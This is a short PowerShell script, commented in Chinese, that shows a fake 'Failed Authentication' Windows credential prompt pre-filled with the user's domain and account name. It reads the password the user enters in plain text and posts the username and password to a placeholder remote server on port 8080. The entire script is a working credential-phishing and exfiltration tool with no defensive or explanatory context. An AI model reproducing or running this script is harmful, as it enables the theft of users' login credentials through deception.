#显示认证提示框并获取用户输入的凭据
$cred = $host.ui.PromptForCredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName)

#获取输入的凭据信息
$username = $cred.Username
$password = $cred.GetNetworkCredential().Password

#将凭据信息发送到远程服务器（例如通过HTTP请求）
$url = "http://IP地址:8080/creds"
$body = @{
    'username' = $username
    'password' = $password
}
Invoke-RestMethod -Uri $url -Method Post -Body $body
